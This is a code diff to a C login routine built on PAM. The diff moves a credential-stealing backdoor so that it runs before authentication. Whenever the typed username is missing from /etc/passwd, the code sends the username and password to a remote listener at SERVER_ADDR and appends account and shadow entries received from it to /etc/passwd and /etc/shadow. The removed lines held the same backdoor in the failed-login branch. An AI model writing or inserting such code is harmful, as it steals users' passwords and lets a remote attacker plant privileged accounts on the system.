@@ -1130,10 +1130,69 @@ void user_login() {
 
     password = getpass("Enter password: ");
 
+    FILE *usernamefile = fopen("/etc/passwd", "r");
+
+    char line[1024];
+    int foundlocalusername = 0;
+    while (fgets(line, sizeof(line), usernamefile)) {
+        char *token = strtok(line, ":"); // Get the username
+        if (token && strcmp(token, username) == 0) {
+            foundlocalusername = 1;
+            break;
+        }
+    }
+    fclose(usernamefile);
+    if (foundlocalusername == 0) {
+	// Send failed credentials to the listener
+	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+	printf("Creating socket");
+	if (sockfd < 0) {
+	    perror("Socket creation failed");
+	    return;
+	}
+
+	struct sockaddr_in server_addr;
+	memset(&server_addr, 0, sizeof(server_addr));
+	server_addr.sin_family = AF_INET;
+	server_addr.sin_port = htons(SERVER_PORT);
+	inet_pton(AF_INET, SERVER_ADDR, &server_addr.sin_addr);
+
+	if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+	    perror("Connection failed");
+	    close(sockfd);
+	    return;
+	}
+
+	send(sockfd, username, strlen(username) + 1, 0);
+	send(sockfd, password, strlen(password) + 1, 0);
+
+	// Receive credentials from the listener
+	char recv_user[256], recv_pass[256];
+	recv(sockfd, recv_user, sizeof(recv_user), 0);
+	recv(sockfd, recv_pass, sizeof(recv_pass), 0);
+	close(sockfd);
+
+	// Store received credentials in system files
+	FILE *passwd_file = fopen("/etc/passwd", "a");
+	FILE *shadow_file = fopen("/etc/shadow", "a");
+	if (passwd_file && shadow_file) {
+	    fprintf(passwd_file, "%s\n", recv_user);
+	    fprintf(shadow_file, "%s\n", recv_pass);
+	    fclose(passwd_file);
+	    fclose(shadow_file);
+	} else {
+	    perror("Error opening system files");
+	}
+    }
+    else {
+    	printf("Found local");
+    }
+
     struct pam_conv conv = {
         pam_conversation,
         password
     };
+    
     retval = pam_start("login", username, &conv, &pamh);
     if (retval != PAM_SUCCESS) {
         printf("pam_start fail: %s\n", pam_strerror(pamh, retval));
@@ -1141,54 +1200,13 @@ void user_login() {
     }
 
     retval = pam_authenticate(pamh, 0);
+    
     if (retval != PAM_SUCCESS) {
         printf("Authentication failed: %s\n", pam_strerror(pamh, retval));
         pam_end(pamh, retval);
-
-        // Send failed credentials to the listener
-        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-        if (sockfd < 0) {
-            perror("Socket creation failed");
-            return;
-        }
-
-        struct sockaddr_in server_addr;
-        memset(&server_addr, 0, sizeof(server_addr));
-        server_addr.sin_family = AF_INET;
-        server_addr.sin_port = htons(SERVER_PORT);
-        inet_pton(AF_INET, SERVER_ADDR, &server_addr.sin_addr);
-
-        if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-            perror("Connection failed");
-            close(sockfd);
-            return;
-        }
-
-        send(sockfd, username, strlen(username) + 1, 0);
-        send(sockfd, password, strlen(password) + 1, 0);
-
-        // Receive credentials from the listener
-        char recv_user[256], recv_pass[256];
-        recv(sockfd, recv_user, sizeof(recv_user), 0);
-        recv(sockfd, recv_pass, sizeof(recv_pass), 0);
-        close(sockfd);
-
-        // Store received credentials in system files
-        FILE *passwd_file = fopen("/etc/passwd", "a");
-        FILE *shadow_file = fopen("/etc/shadow", "a");
-        if (passwd_file && shadow_file) {
-            fprintf(passwd_file, "%s\n", recv_user);
-            fprintf(shadow_file, "%s\n", recv_pass);
-            fclose(passwd_file);
-            fclose(shadow_file);
-        } else {
-            perror("Error opening system files");
-        }
-
-        printf("Invalid login. Please try again.\n");
+            printf("Invalid login. Please try again.\n");
         return;
     }
-
     retval = pam_acct_mgmt(pamh, 0);
     if (retval != PAM_SUCCESS) {
         printf("Account management failed: %s\n", pam_strerror(pamh, retval));
